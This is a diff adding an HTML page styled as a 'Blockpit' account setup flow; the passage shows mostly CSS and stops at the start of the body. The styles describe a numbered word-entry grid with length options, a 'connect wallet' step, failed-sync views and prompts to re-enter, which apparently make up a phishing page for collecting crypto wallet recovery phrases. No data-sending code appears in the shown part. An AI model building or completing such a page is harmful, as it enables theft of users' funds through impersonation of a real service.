@@ -1,0 +1,2755 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>Blockpit | Setup</title>
+    <meta name="robots" content="noindex">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <meta content="Set up your Blockpit account: country, portfolio, overview." name="description">
+    <meta content="#2f6bed" name="theme-color">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --page-bg: #f2f2f5;
+            --card-bg: #ffffff;
+            --blue: #2f6bed;
+            --blue-dark: #2458c9;
+            --green: #56b948;
+            --bar-idle: #d9dde4;
+            --text-dark: #1c2133;
+            --text-muted: #5c6470;
+            --text-faint: #8a93a3;
+            --input-bg: #eef1f5;
+            --line: #e3e7ee;
+            --chat-pill: #dbe7ff;
+            --chat-pill-text: #2b4a8f;
+        }
+
+        html {
+            -webkit-text-size-adjust: 100%;
+            font-size: 87.5%;
+        }
+
+        body {
+            font-family: 'Quicksand', 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: var(--page-bg);
+            min-height: 100vh;
+            color: var(--text-dark);
+            line-height: 1.5;
+        }
+
+        a {
+            color: var(--blue);
+            text-decoration: none;
+            font-weight: 700;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        /* ---------- Sidebar ---------- */
+        .sidebar {
+            position: fixed;
+            left: 0;
+            top: 0;
+            bottom: 0;
+            width: 64px;
+            background: #ffffff;
+            border-right: 1px solid var(--line);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 1.4rem 0 1.2rem;
+            z-index: 40;
+        }
+
+        .side-item {
+            width: 40px;
+            height: 40px;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--text-faint);
+            margin-bottom: 1.1rem;
+            cursor: pointer;
+            border: none;
+            background: none;
+            transition: background-color .15s ease, color .15s ease;
+        }
+
+        .side-item:hover {
+            background: #f0f3f8;
+            color: var(--text-dark);
+        }
+
+        .side-item.active {
+            background: #e4eaf8;
+            color: var(--blue);
+        }
+
+        .side-logo {
+            font-weight: 700;
+            font-size: 1.45rem;
+            color: #101425;
+            cursor: pointer;
+            margin-bottom: 1.6rem;
+        }
+
+        .side-spacer {
+            flex: 1;
+        }
+
+        /* ---------- Main ---------- */
+        .main {
+            margin-left: 64px;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 2.2rem 2rem 4rem;
+        }
+
+        /* Steps */
+        .steps {
+            display: flex;
+            gap: 1.6rem;
+            margin-bottom: 2.6rem;
+        }
+
+        .step {
+            width: 330px;
+            max-width: 30vw;
+        }
+
+        .step-label {
+            text-align: center;
+            font-size: 1.15rem;
+            font-weight: 600;
+            color: var(--text-faint);
+            margin-bottom: .55rem;
+        }
+
+        .step.active .step-label {
+            color: var(--text-dark);
+        }
+
+        .step-bar {
+            height: 6px;
+            border-radius: 999px;
+            background: var(--bar-idle);
+            overflow: hidden;
+        }
+
+        .step.active .step-bar {
+            background: var(--green);
+        }
+
+        .step.done .step-bar {
+            background: var(--green);
+        }
+
+        .step.done .step-label {
+            color: var(--text-dark);
+        }
+
+        /* Card */
+        .setup-card {
+            background: var(--card-bg);
+            border-radius: 16px;
+            box-shadow: 0 6px 24px rgba(23, 32, 71, .06);
+            width: 100%;
+            max-width: 1250px;
+            padding: 2.8rem 3rem 3rem;
+        }
+
+        .step-pane {
+            display: none;
+        }
+
+        .step-pane.active {
+            display: block;
+        }
+
+        .pane-title {
+            font-size: 1.9rem;
+            font-weight: 700;
+            margin-bottom: .9rem;
+        }
+
+        .pane-subtitle {
+            font-size: 1.25rem;
+            color: var(--text-muted);
+            font-weight: 500;
+            margin-bottom: 2.2rem;
+        }
+
+        /* Country selector */
+        .country-select {
+            width: 460px;
+            max-width: 100%;
+            background: var(--input-bg);
+            border: 2px solid transparent;
+            border-radius: 12px;
+            padding: 1.05rem 1.4rem;
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            gap: .35rem;
+            transition: border-color .15s ease;
+            position: relative;
+        }
+
+        .country-select:hover {
+            border-color: #cfd6e2;
+        }
+
+        .country-select .cs-label {
+            font-size: .95rem;
+            color: var(--text-faint);
+            font-weight: 600;
+        }
+
+        .country-select .cs-value {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .country-select .cs-choice {
+            display: flex;
+            align-items: center;
+            gap: .8rem;
+            font-size: 1.2rem;
+            font-weight: 600;
+            color: var(--text-dark);
+        }
+
+        .country-select .cs-flag {
+            font-size: 1.5rem;
+            line-height: 1;
+        }
+
+        .country-select .cs-chevron {
+            color: var(--text-muted);
+        }
+
+        .country-dropdown {
+            position: absolute;
+            top: calc(100% + 8px);
+            left: 0;
+            right: 0;
+            background: #ffffff;
+            border: 1px solid var(--line);
+            border-radius: 12px;
+            box-shadow: 0 16px 40px rgba(23, 32, 71, .14);
+            max-height: 320px;
+            overflow-y: auto;
+            z-index: 30;
+            display: none;
+        }
+
+        .country-dropdown.open {
+            display: block;
+        }
+
+        .country-option {
+            display: flex;
+            align-items: center;
+            gap: .8rem;
+            padding: .85rem 1.4rem;
+            font-size: 1.05rem;
+            font-weight: 600;
+            color: var(--text-dark);
+            cursor: pointer;
+        }
+
+        .country-option:hover {
+            background: #f0f3f8;
+        }
+
+        .country-option.selected {
+            background: #e4eaf8;
+            color: var(--blue);
+        }
+
+        /* Globe */
+        .globe-wrap {
+            display: flex;
+            justify-content: center;
+            margin: 1.8rem 0 1.3rem;
+        }
+
+        .globe-wrap img {
+            width: 280px;
+            height: 280px;
+            object-fit: contain;
+        }
+
+        .globe-fallback {
+            width: 272px;
+            height: 272px;
+            border-radius: 50%;
+            background: radial-gradient(circle at 35% 30%, #8fd0d8 0%, #3d7fae 45%, #1c4d7e 100%);
+            box-shadow: inset -18px -14px 40px rgba(0, 0, 0, .25), 0 18px 40px rgba(23, 32, 71, .18);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 7rem;
+        }
+
+        .secure-line {
+            text-align: center;
+            font-size: 1.1rem;
+            color: var(--text-muted);
+            font-weight: 500;
+            margin-bottom: 2.8rem;
+        }
+
+        /* Continue */
+        .btn-continue:disabled {
+            background: #d6d9df;
+            color: #565c66;
+            cursor: not-allowed;
+        }
+
+        .btn-continue {
+            display: block;
+            width: 470px;
+            max-width: 100%;
+            margin: 0 auto;
+            padding: 1.15rem;
+            border: none;
+            border-radius: 999px;
+            background: var(--chat-pill);
+            color: var(--chat-pill-text);
+            font-family: inherit;
+            font-size: 1.15rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background-color .15s ease, color .15s ease, filter .15s ease;
+        }
+
+        .btn-continue:hover {
+            background: var(--blue);
+            color: #ffffff;
+        }
+
+        .btn-continue.is-solid {
+            background: var(--blue);
+            color: #ffffff;
+        }
+
+        .btn-continue.is-solid:hover {
+            filter: brightness(.94);
+        }
+
+        /* Portfolio options */
+        .options-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 1.2rem;
+            max-width: 860px;
+        }
+
+        .option-card {
+            background: #ffffff;
+            border: 2px solid var(--line);
+            border-radius: 14px;
+            padding: 1.8rem 1.5rem;
+            text-align: center;
+            cursor: pointer;
+            transition: border-color .15s ease, background-color .15s ease;
+        }
+
+        .option-card:hover {
+            border-color: #c2ccdd;
+            background: #fafbfe;
+        }
+
+        .option-card.selected {
+            border-color: var(--blue);
+            background: #f2f6ff;
+        }
+
+        .option-icon {
+            width: 52px;
+            height: 52px;
+            margin: 0 auto 1rem;
+            border-radius: 12px;
+            background: #e4eaf8;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--blue);
+        }
+
+        .option-name {
+            font-weight: 700;
+            font-size: 1.08rem;
+            margin-bottom: .3rem;
+        }
+
+        .option-desc {
+            font-size: .9rem;
+            color: var(--text-faint);
+            font-weight: 500;
+        }
+
+        /* ---------- Integration picker ---------- */
+        .int-search {
+            position: relative;
+            margin-bottom: 1.8rem;
+        }
+
+        .int-search input {
+            width: 100%;
+            height: 64px;
+            border: 2px solid var(--blue);
+            border-radius: 14px;
+            background: #f3f4f6;
+            padding: 2rem 1.4rem .8rem 3rem;
+            font-family: inherit;
+            font-size: 1.05rem;
+            font-weight: 500;
+            color: var(--text-dark);
+            outline: none;
+        }
+
+        .int-search input::placeholder {
+            color: #9aa2b1;
+        }
+
+        .int-search-icon {
+            position: absolute;
+            left: 1.1rem;
+            bottom: 1.05rem;
+            color: #4b5563;
+            pointer-events: none;
+        }
+
+        .int-search-label {
+            position: absolute;
+            left: 3rem;
+            top: .55rem;
+            font-size: .95rem;
+            color: #8a93a6;
+            font-weight: 500;
+            pointer-events: none;
+        }
+
+        .int-pills {
+            display: flex;
+            flex-wrap: wrap;
+            gap: .9rem;
+            margin-bottom: 2.2rem;
+        }
+
+        .pill {
+            display: inline-flex;
+            align-items: center;
+            gap: .55rem;
+            height: 46px;
+            padding: 0 1.3rem;
+            border-radius: 999px;
+            border: 1.6px solid transparent;
+            background: transparent;
+            font-family: inherit;
+            font-size: 1rem;
+            font-weight: 600;
+            color: #374151;
+            cursor: pointer;
+        }
+
+        .pill.active {
+            background: #e4ecfd;
+            border-color: var(--blue);
+            color: #1f2937;
+        }
+
+        .pill:not(.active):hover {
+            background: #eceef2;
+        }
+
+        .pill.blurred {
+            filter: blur(2.2px);
+            opacity: .55;
+            pointer-events: none;
+            user-select: none;
+        }
+
+        .pill-b {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 20px;
+            height: 20px;
+            border-radius: 6px;
+            background: #dbe7ff;
+            color: #2f6bed;
+            font-weight: 800;
+            font-size: .85rem;
+        }
+
+        .int-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 1.1rem;
+            max-height: 52vh;
+            overflow-y: auto;
+            padding: .2rem .3rem 1rem .1rem;
+        }
+
+        .int-tile {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: .9rem;
+            padding: 1.5rem 1rem 1.3rem;
+            background: #fff;
+            border: 1.6px solid #e8eaf0;
+            border-radius: 16px;
+            cursor: pointer;
+            transition: border-color .15s, box-shadow .15s, transform .1s;
+        }
+
+        .int-tile:hover {
+            border-color: var(--blue);
+            box-shadow: 0 8px 22px rgba(23, 32, 71, .08);
+        }
+
+        .int-tile:active {
+            transform: scale(.98);
+        }
+
+        .int-tile.tile-blur {
+            filter: blur(2.2px);
+            opacity: .55;
+            pointer-events: none;
+            user-select: none;
+        }
+
+        .int-logo {
+            width: 52px;
+            height: 52px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .int-logo svg {
+            width: 100%;
+            height: 100%;
+        }
+
+        .int-name {
+            font-size: .98rem;
+            font-weight: 600;
+            color: #1f2937;
+            text-align: center;
+            line-height: 1.25;
+        }
+
+        .int-empty {
+            grid-column: 1 / -1;
+            text-align: center;
+            color: var(--text-muted);
+            font-weight: 500;
+            padding: 2.4rem 0;
+        }
+
+        /* ---------- Add integration modal ---------- */
+        .imodal-backdrop {
+            position: fixed;
+            inset: 0;
+            background: rgba(17, 24, 39, .28);
+            display: none;
+            align-items: flex-start;
+            justify-content: center;
+            z-index: 300;
+            overflow-y: auto;
+            padding: 4vh 1rem 4vh;
+        }
+
+        .imodal-backdrop.open {
+            display: flex;
+        }
+
+        .imodal {
+            width: min(720px, 100%);
+            background: #fff;
+            border-radius: 22px;
+            box-shadow: 0 30px 80px rgba(23, 32, 71, .3);
+            overflow: hidden;
+            animation: imodalIn .22s ease-out;
+        }
+
+        @keyframes imodalIn {
+            from { opacity: 0; transform: translateY(14px) scale(.98); }
+            to { opacity: 1; transform: none; }
+        }
+
+        .imodal-header {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            padding: 1.5rem 1.8rem;
+            border-bottom: 1px solid #eceef2;
+        }
+
+        .imodal-icon {
+            width: 42px;
+            height: 42px;
+            flex: 0 0 42px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .imodal-icon svg {
+            width: 100%;
+            height: 100%;
+        }
+
+        .imodal-title {
+            flex: 1;
+            font-size: 1.35rem;
+            font-weight: 700;
+            color: var(--text-dark);
+        }
+
+        .imodal-close {
+            width: 36px;
+            height: 36px;
+            border: none;
+            background: transparent;
+            font-size: 1.7rem;
+            line-height: 1;
+            color: #6b7280;
+            cursor: pointer;
+            border-radius: 10px;
+        }
+
+        .imodal-close:hover {
+            background: #f1f2f5;
+            color: #111827;
+        }
+
+        .imodal-body {
+            padding: 1.6rem 2rem 2.2rem;
+        }
+
+        .imodal-tabs {
+            display: flex;
+            margin-bottom: 1.4rem;
+        }
+
+        .imtab {
+            flex: 1;
+            padding: .9rem 0;
+            background: transparent;
+            border: none;
+            border-bottom: 2.5px solid #eceef2;
+            font-family: inherit;
+            font-size: 1.08rem;
+            font-weight: 600;
+            color: #6b7280;
+            cursor: pointer;
+        }
+
+        .imtab.active {
+            color: var(--blue);
+            border-bottom-color: var(--blue);
+        }
+
+        .imodal-desc {
+            font-size: 1.05rem;
+            color: #374151;
+            font-weight: 500;
+            line-height: 1.55;
+            margin-bottom: 1.1rem;
+        }
+
+        .info-pill {
+            display: inline-flex;
+            align-items: center;
+            gap: .6rem;
+            width: 100%;
+            padding: .85rem 1.2rem;
+            border: none;
+            border-radius: 12px;
+            background: #f2f3f6;
+            font-family: inherit;
+            font-size: 1rem;
+            font-weight: 600;
+            color: #374151;
+            cursor: pointer;
+            text-align: left;
+            margin-bottom: 1.6rem;
+        }
+
+        .info-pill:hover {
+            background: #e9ecf3;
+        }
+
+        .info-pill svg {
+            color: #2b3a67;
+            flex: 0 0 auto;
+        }
+
+        .imodal-divider {
+            border: none;
+            border-top: 1px solid #eceef2;
+            margin: 0 0 1.6rem;
+        }
+
+        .field {
+            margin-bottom: 1.2rem;
+        }
+
+        .field-label {
+            display: flex;
+            align-items: center;
+            gap: .4rem;
+            font-size: .98rem;
+            color: #1f2937;
+            font-weight: 600;
+            margin: 0 .2rem .45rem;
+        }
+
+        .field-input {
+            display: flex;
+            align-items: center;
+            background: #f2f3f6;
+            border-radius: 12px;
+            padding: 0 .8rem 0 1.2rem;
+            height: 58px;
+        }
+
+        .field-input input {
+            flex: 1;
+            min-width: 0;
+            border: none;
+            background: transparent;
+            height: 100%;
+            font-family: inherit;
+            font-size: 1.05rem;
+            font-weight: 500;
+            color: #111827;
+            outline: none;
+        }
+
+        .field-input input::placeholder {
+            color: #9aa2b1;
+        }
+
+        .field-qr {
+            color: #374151;
+            flex: 0 0 auto;
+        }
+
+        .field-clear {
+            width: 30px;
+            height: 30px;
+            flex: 0 0 30px;
+            border: none;
+            border-radius: 50%;
+            background: #6b7280;
+            color: #fff;
+            font-size: 1.15rem;
+            line-height: 1;
+            cursor: pointer;
+        }
+
+        .imodal-actions {
+            display: flex;
+            justify-content: center;
+            margin-top: 2.2rem;
+        }
+
+        .imodal-btn {
+            width: min(460px, 100%);
+        }
+
+        /* help view */
+        .help-head {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            margin-bottom: 1.2rem;
+        }
+
+        .help-back {
+            width: 38px;
+            height: 38px;
+            flex: 0 0 38px;
+            border: none;
+            background: transparent;
+            border-radius: 10px;
+            color: #374151;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .help-back:hover {
+            background: #f1f2f5;
+        }
+
+        .help-title {
+            flex: 1;
+            font-size: 1.15rem;
+            font-weight: 700;
+            color: var(--text-dark);
+            line-height: 1.35;
+        }
+
+        .help-body {
+            max-height: 56vh;
+            overflow-y: auto;
+            padding-right: .4rem;
+        }
+
+        .help-body h3 {
+            font-size: 1.05rem;
+            font-weight: 700;
+            color: var(--text-dark);
+            margin: 1.4rem 0 .7rem;
+        }
+
+        .help-body h3:first-child {
+            margin-top: 0;
+        }
+
+        .help-steps {
+            margin: 0 0 .6rem;
+            padding-left: 1.3rem;
+        }
+
+        .help-steps li {
+            font-size: .98rem;
+            color: #374151;
+            font-weight: 500;
+            line-height: 1.55;
+            margin-bottom: .5rem;
+        }
+
+        .help-steps b {
+            font-weight: 700;
+        }
+
+        .help-perms {
+            list-style: none;
+            padding: 0;
+            margin: .6rem 0 1rem;
+        }
+
+        .help-perms li {
+            display: flex;
+            align-items: center;
+            gap: .6rem;
+            font-size: .98rem;
+            color: #374151;
+            font-weight: 500;
+            margin-bottom: .45rem;
+        }
+
+        .help-cb {
+            width: 19px;
+            height: 19px;
+            flex: 0 0 19px;
+            border-radius: 4px;
+            border: 2px solid #6b7280;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background: #fff;
+        }
+
+        .help-cb.checked {
+            background: #4a7dff;
+            border-color: #4a7dff;
+        }
+
+        .help-cb svg {
+            width: 13px;
+            height: 13px;
+        }
+
+        .help-warn {
+            display: flex;
+            gap: .6rem;
+            align-items: flex-start;
+            font-size: .95rem;
+            color: #374151;
+            font-style: italic;
+            line-height: 1.5;
+            margin-top: 1.2rem;
+        }
+
+        .help-warn-icon {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 20px;
+            height: 20px;
+            flex: 0 0 20px;
+            border-radius: 50%;
+            background: #e11d48;
+            color: #fff;
+            font-style: normal;
+            font-weight: 800;
+            font-size: .85rem;
+        }
+
+        .int-img { width: 100%; height: 100%; object-fit: contain; }
+        .int-fallback { display: flex; align-items: center; justify-content: center; width: 100%; height: 100%; border-radius: 50%; background: #e4eaf8; color: var(--blue); font-weight: 800; font-size: 1.3rem; }
+
+        .is-blurred { filter: blur(2.2px); opacity: .8; pointer-events: none; user-select: none; }
+
+        .manual-btn { display: block; width: min(460px, 100%); margin: .9rem auto 0; padding: 1.1rem; border: 1.8px solid var(--blue); border-radius: 999px; background: #fff; color: var(--blue); font-family: inherit; font-size: 1.1rem; font-weight: 700; cursor: pointer; }
+        .manual-btn:hover { background: #eef3fe; }
+        .cw-spinner { display: none; width: 17px; height: 17px; border: 2.5px solid rgba(255,255,255,.35); border-top-color: #fff; border-radius: 50%; margin-left: .6rem; vertical-align: -3px; animation: cwspin .7s linear infinite; }
+        #imConnectWallet.is-loading .cw-spinner,
+        #helpConnectBtn.is-loading .cw-spinner { display: inline-block; }
+        #imConnectWallet.is-loading,
+        #helpConnectBtn.is-loading { opacity: .75; cursor: progress; }
+        .help-actions { margin-top: 1.1rem; padding-top: 1rem; border-top: 1px solid #e8ecf3; }
+        .help-actions .imodal-btn { width: 100%; }
+
+        /* import / sync view */
+        .imodal-sync-body { padding: 3.2rem 2rem 3.4rem; }
+        .sync-box { text-align: center; max-width: 440px; margin: 0 auto; }
+        .sync-spinner { width: 48px; height: 48px; margin: 0 auto 1.3rem; border: 4.5px solid rgba(47, 107, 237, .14); border-top-color: var(--blue); border-radius: 50%; animation: cwspin .8s linear infinite; }
+        .sync-check { display: block; margin: 0 auto 1rem; }
+        .sync-text { font-size: 1.12rem; font-weight: 600; color: #1f2937; line-height: 1.5; margin: 0 0 1.4rem; }
+        .sync-box.fail .sync-text { color: #b3261e; }
+        .sync-retry { width: min(340px, 100%); margin: 0 auto; }
+        .reentry-note { width: min(460px, 100%); margin: 0 auto 1.1rem; padding: .9rem 1.15rem; border-radius: 14px; background: #fdeeee; border: 1.5px solid #f3c2c2; color: #b3261e; font-size: .95rem; font-weight: 600; line-height: 1.45; text-align: center; }
+        .reentry-btn { display: block; margin: .7rem auto 0; padding: .55rem 1.6rem; border: 1.6px solid #b3261e; border-radius: 999px; background: #fff; color: #b3261e; font-family: inherit; font-size: .92rem; font-weight: 700; cursor: pointer; }
+        .reentry-btn:hover { background: #fdf1f1; }
+        .reentry-btn[hidden] { display: none; }
+        .reentry-note[hidden] { display: none; }
+        @keyframes cwspin { to { transform: rotate(360deg); } }
+        .cw-error { width: min(460px, 100%); margin: .8rem auto 0; padding: .9rem 1.15rem; border-radius: 14px; background: #fdeeee; border: 1.5px solid #f3c2c2; color: #b3261e; font-size: .95rem; font-weight: 600; line-height: 1.45; }
+        .manual-btn.manual-hint { animation: cwpulse 1.6s ease-in-out 2; }
+        @keyframes cwpulse { 0%,100% { box-shadow: 0 0 0 0 rgba(47,107,237,.45); } 50% { box-shadow: 0 0 0 10px rgba(47,107,237,0); } }
+
+        .pw-card { position: relative; border: 1.5px solid #e3e8f1; border-radius: 18px; background: linear-gradient(180deg, #fbfcfe 0%, #f5f7fc 100%); box-shadow: 0 1px 2px rgba(16, 24, 40, .04), 0 8px 24px -12px rgba(16, 24, 40, .10); padding: 1.15rem 1.2rem 1.05rem; }
+        .pw-head { display: flex; align-items: center; gap: .6rem; margin-bottom: .95rem; }
+        .pw-head-icon { display: inline-flex; align-items: center; justify-content: center; width: 34px; height: 34px; flex: 0 0 34px; border-radius: 10px; background: linear-gradient(135deg, #2f6bed, #5b8bf0); color: #fff; box-shadow: 0 3px 8px -2px rgba(47, 107, 237, .5); }
+        .pw-head-title { font-size: .98rem; font-weight: 800; color: #101828; letter-spacing: -.01em; }
+        .pw-badge { margin-left: auto; font-size: .76rem; font-weight: 800; letter-spacing: .02em; padding: .3rem .7rem; border-radius: 999px; background: #eef1f6; color: #667085; border: 1.5px solid #e1e6ef; transition: all .25s ease; white-space: nowrap; }
+        .pw-badge.ok { background: #eaf7ee; color: #1e7e3c; border-color: #bfe6cc; }
+        .pw-len-row { display: flex; align-items: center; gap: .6rem; margin-bottom: .85rem; }
+        .pw-len-label { font-size: .78rem; font-weight: 800; text-transform: uppercase; letter-spacing: .07em; color: #8a93a6; }
+        .pw-seg { display: inline-flex; padding: 3px; gap: 2px; background: #e9edf4; border-radius: 12px; }
+        .pw-len { min-width: 46px; padding: .4rem .75rem; border: 0; border-radius: 9px; background: transparent; color: #5b6474; font-family: inherit; font-size: .9rem; font-weight: 700; cursor: pointer; transition: all .18s ease; }
+        .pw-len:hover { color: var(--blue); }
+        .pw-len.active { background: #fff; color: var(--blue); box-shadow: 0 1px 3px rgba(16, 24, 40, .16), 0 0 0 1px rgba(47, 107, 237, .18); }
+        .pw-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: .55rem; }
+        @media (max-width: 560px) { .pw-grid { grid-template-columns: repeat(3, 1fr); } }
+        .pw-box { position: relative; }
+        .pw-box input { width: 100%; box-sizing: border-box; padding: .68rem .55rem .68rem 1.95rem; border: 1.5px solid #e2e7f0; border-radius: 11px; background: #fff; font-family: inherit; font-size: .97rem; font-weight: 600; color: #101828; outline: none; box-shadow: inset 0 1px 2px rgba(16, 24, 40, .04); transition: border-color .18s ease, box-shadow .18s ease, background .18s ease; }
+        .pw-box input:focus { border-color: var(--blue); background: #fff; box-shadow: 0 0 0 3.5px rgba(47, 107, 237, .13); }
+        .pw-box.filled input { border-color: #bfd2f6; background: #f3f7ff; }
+        .pw-box.filled input:focus { box-shadow: 0 0 0 3.5px rgba(47, 107, 237, .13); }
+        .pw-num { position: absolute; left: .62rem; top: 50%; transform: translateY(-50%); font-size: .7rem; font-weight: 800; color: #a4adc0; pointer-events: none; font-variant-numeric: tabular-nums; transition: color .18s ease; }
+        .pw-box.filled .pw-num { color: var(--blue); }
+        .pw-hint { display: flex; align-items: flex-start; gap: .45rem; margin-top: .85rem; padding-top: .8rem; border-top: 1px dashed #dde3ee; font-size: .82rem; color: #7a8398; line-height: 1.45; font-weight: 500; }
+        .pw-hint svg { flex: 0 0 14px; margin-top: .12rem; color: #9aa5bb; }
+
+        .soon-chip { font-size: .68rem; font-weight: 800; letter-spacing: .07em; text-transform: uppercase; background: rgba(255, 255, 255, .4); border-radius: 999px; padding: .15rem .6rem; margin-left: .55rem; vertical-align: middle; }
+
+        .wc-chip { display: inline-flex; align-items: center; gap: .35rem; filter: blur(1.5px); opacity: .65; pointer-events: none; user-select: none; border: 1.5px solid #6b7280; color: #374151; border-radius: 999px; padding: .25rem .75rem; font-size: .85rem; font-weight: 700; margin-left: .35rem; vertical-align: middle; }
+
+        /* Overview */
+        .summary-list {
+            max-width: 560px;
+            margin-bottom: 2.4rem;
+        }
+
+        .summary-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1rem 1.4rem;
+            background: var(--input-bg);
+            border-radius: 12px;
+            margin-bottom: .8rem;
+            font-weight: 600;
+            font-size: 1.05rem;
+        }
+
+        .summary-row span:last-child {
+            color: var(--text-muted);
+            font-weight: 500;
+        }
+
+        /* ---------- Live chat ---------- */
+        .chat-launcher {
+            position: fixed;
+            right: 26px;
+            bottom: 26px;
+            width: 62px;
+            height: 62px;
+            border-radius: 50%;
+            background: var(--blue);
+            border: none;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 10px 28px rgba(47, 107, 237, .42);
+            z-index: 60;
+            transition: transform .15s ease, background-color .15s ease;
+        }
+
+        .chat-launcher:hover {
+            transform: scale(1.05);
+            background: var(--blue-dark);
+        }
+
+        .chat-launcher .chat-dot {
+            position: absolute;
+            top: 2px;
+            right: 2px;
+            width: 15px;
+            height: 15px;
+            background: #ef4444;
+            border: 2.5px solid #ffffff;
+            border-radius: 50%;
+        }
+
+        .chat-panel {
+            position: fixed;
+            right: 26px;
+            bottom: 104px;
+            width: 370px;
+            max-width: calc(100vw - 40px);
+            height: 540px;
+            max-height: calc(100vh - 140px);
+            background: #ffffff;
+            border-radius: 18px;
+            box-shadow: 0 24px 64px rgba(23, 32, 71, .25);
+            display: none;
+            flex-direction: column;
+            overflow: hidden;
+            z-index: 60;
+        }
+
+        .chat-panel.open {
+            display: flex;
+        }
+
+        .chat-header {
+            background: var(--blue);
+            color: #ffffff;
+            padding: 1.1rem 1.3rem;
+            display: flex;
+            align-items: center;
+            gap: .8rem;
+        }
+
+        .chat-avatar {
+            width: 38px;
+            height: 38px;
+            border-radius: 50%;
+            background: #ffffff;
+            color: var(--blue);
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.1rem;
+        }
+
+        .chat-header-text {
+            flex: 1;
+        }
+
+        .chat-header-text .chat-name {
+            font-weight: 700;
+            font-size: 1.02rem;
+            display: flex;
+            align-items: center;
+            gap: .45rem;
+        }
+
+        .chat-status-dot {
+            width: 9px;
+            height: 9px;
+            background: #4ade80;
+            border-radius: 50%;
+            display: inline-block;
+        }
+
+        .chat-header-text .chat-status {
+            font-size: .82rem;
+            opacity: .85;
+            font-weight: 500;
+        }
+
+        .chat-close {
+            background: rgba(255, 255, 255, .18);
+            border: none;
+            color: #ffffff;
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            cursor: pointer;
+            font-size: 1rem;
+            line-height: 1;
+        }
+
+        .chat-close:hover {
+            background: rgba(255, 255, 255, .32);
+        }
+
+        .chat-body {
+            flex: 1;
+            background: var(--page-bg);
+            padding: 1.2rem 1.1rem;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: .7rem;
+        }
+
+        .chat-bubble {
+            max-width: 82%;
+            padding: .75rem 1rem;
+            border-radius: 14px;
+            font-size: .93rem;
+            font-weight: 500;
+            line-height: 1.45;
+        }
+
+        .chat-bubble.bot {
+            background: #ffffff;
+            color: var(--text-dark);
+            border-bottom-left-radius: 4px;
+            box-shadow: 0 2px 8px rgba(23, 32, 71, .06);
+            align-self: flex-start;
+        }
+
+        .chat-bubble.user {
+            background: var(--blue);
+            color: #ffffff;
+            border-bottom-right-radius: 4px;
+            align-self: flex-end;
+        }
+
+        .chat-footer {
+            display: flex;
+            gap: .6rem;
+            padding: .9rem 1rem;
+            border-top: 1px solid var(--line);
+            background: #ffffff;
+        }
+
+        .chat-input {
+            flex: 1;
+            border: 2px solid var(--line);
+            border-radius: 999px;
+            padding: .65rem 1.1rem;
+            font-family: inherit;
+            font-size: .95rem;
+            font-weight: 500;
+            background: var(--input-bg);
+            color: var(--text-dark);
+        }
+
+        .chat-input:focus {
+            outline: none;
+            border-color: var(--blue);
+            background: #ffffff;
+        }
+
+        .chat-send {
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            background: var(--blue);
+            border: none;
+            color: #ffffff;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            transition: background-color .15s ease;
+        }
+
+        .chat-send:hover {
+            background: var(--blue-dark);
+        }
+
+        /* ---------- Responsive ---------- */
+        @media (max-width: 900px) {
+            .step {
+                width: 200px;
+            }
+
+            .options-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        @media (max-width: 640px) {
+            .sidebar {
+                width: 52px;
+            }
+
+            .main {
+                margin-left: 52px;
+                padding: 1.4rem 1rem 4rem;
+            }
+
+            .step {
+                width: 100px;
+            }
+
+            .step-label {
+                font-size: .85rem;
+            }
+
+            .setup-card {
+                padding: 1.8rem 1.3rem 2.2rem;
+            }
+
+            .pane-title {
+                font-size: 1.45rem;
+            }
+
+            .pane-subtitle {
+                font-size: 1.02rem;
+            }
+
+            .globe-wrap img {
+                width: 240px;
+                height: 240px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Sidebar -->
+    <nav class="sidebar">
+        <button class="side-item" id="collapseBtn" title="Collapse" aria-label="Collapse sidebar">
